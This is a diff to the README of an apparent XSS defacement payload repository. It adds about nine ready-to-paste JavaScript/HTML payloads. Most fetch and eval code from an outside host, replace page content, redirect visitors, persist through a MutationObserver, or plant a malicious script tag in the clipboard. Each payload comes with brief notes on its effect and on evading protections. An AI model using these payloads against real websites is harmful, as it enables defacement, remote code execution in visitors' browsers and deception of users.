@@ -19,6 +19,144 @@ This repository contains various XSS (Cross-Site Scripting) deface payloads that
 12. [Using `outerHTML` to load and execute external content](#using-outerhtml-to-load-and-execute-external-content)
 13. [Using `innerHTML` with `shadowRoot` to load and execute external content](#using-innerhtml-with-shadowroot-to-load-and-execute-external-content)
 
+
+
+### Using `eval` with Fetch API
+
+```html
+<script>
+fetch('https://karthikdude.github.io/Deface/script.js')
+    .then(response => response.text())
+    .then(script => {
+        eval(script);
+    });
+</script>
+```
+
+**Details:** This payload fetches an external JavaScript file and executes it directly using `eval`. While this is a less secure approach, it is effective in environments where execution of external scripts is needed.
+
+---
+
+### Using `setTimeout` for Delayed Execution
+
+```html
+<script>
+setTimeout(() => {
+    fetch('https://karthikdude.github.io/Deface/')
+        .then(response => response.text())
+        .then(html => {
+            document.body.innerHTML = html;
+            const scripts = document.body.getElementsByTagName('script');
+            for (let script of scripts) {
+                eval(script.innerText);
+            }
+        });
+}, 5000);
+</script>
+```
+
+**Details:** This payload delays the execution of the defacement script by 5 seconds. This can be useful in scenarios where a delay is needed to bypass certain protections or load conditions.
+
+---
+
+### Using `window.location` for Redirection
+
+```html
+<script>
+window.location = 'https://karthikdude.github.io/Deface/';
+</script>
+```
+
+**Details:** This payload redirects the user to an external page. This is a simple but effective defacement method that changes the displayed content entirely.
+
+---
+
+### Using `srcdoc` Attribute in an Iframe
+
+```html
+<iframe srcdoc="<h1>Hacked!</h1><script>alert('Defaced!')</script>" style="border: none; width: 100%; height: 100%;"></iframe>
+```
+
+**Details:** This payload uses the `srcdoc` attribute of an iframe to inject custom HTML and JavaScript. It is a self-contained defacement payload that does not depend on external resources.
+
+---
+
+### Using `fetch` with Dynamic Script Injection
+
+```html
+<script>
+fetch('https://karthikdude.github.io/Deface/')
+    .then(response => response.text())
+    .then(html => {
+        const script = document.createElement('script');
+        script.innerHTML = html;
+        document.body.appendChild(script);
+    });
+</script>
+```
+
+**Details:** This payload dynamically creates a script element, injects the fetched content into it, and appends it to the document body.
+
+---
+
+### Using `MutationObserver` for Persistent Defacement
+
+```html
+<script>
+const observer = new MutationObserver(() => {
+    fetch('https://karthikdude.github.io/Deface/')
+        .then(response => response.text())
+        .then(html => {
+            document.body.innerHTML = html;
+        });
+});
+observer.observe(document.body, { childList: true });
+</script>
+```
+
+**Details:** This payload uses a `MutationObserver` to monitor changes to the `body` element. If the body changes, it reloads the defacement content, ensuring persistence.
+
+---
+
+### Using `navigator.clipboard` to Inject Content
+
+```html
+<script>
+navigator.clipboard.writeText('<script src="https://karthikdude.github.io/Deface/script.js"></script>');
+alert('Clipboard content updated!');
+</script>
+```
+
+**Details:** This payload writes a malicious script to the clipboard. While it doesn’t directly deface the site, it can trick users into pasting harmful content.
+
+---
+
+### Using `document.createElement` with Image Injection
+
+```html
+<script>
+const img = document.createElement('img');
+img.src = 'https://karthikdude.github.io/Deface/image.jpg';
+img.style = 'width: 100%; height: auto;';
+document.body.innerHTML = '';
+document.body.appendChild(img);
+</script>
+```
+
+**Details:** This payload replaces the entire content of the page with an image from an external source. It is a visual defacement technique.
+
+---
+
+### Using `onerror` Attribute for Script Execution
+
+```html
+<img src="invalid.jpg" onerror="fetch('https://karthikdude.github.io/Deface/').then(res => res.text()).then(eval)">
+```
+
+**Details:** This payload uses the `onerror` attribute of an image element to execute a script when the image fails to load.
+
+
+
 ## Using jQuery to load and execute external content
 
 ```html
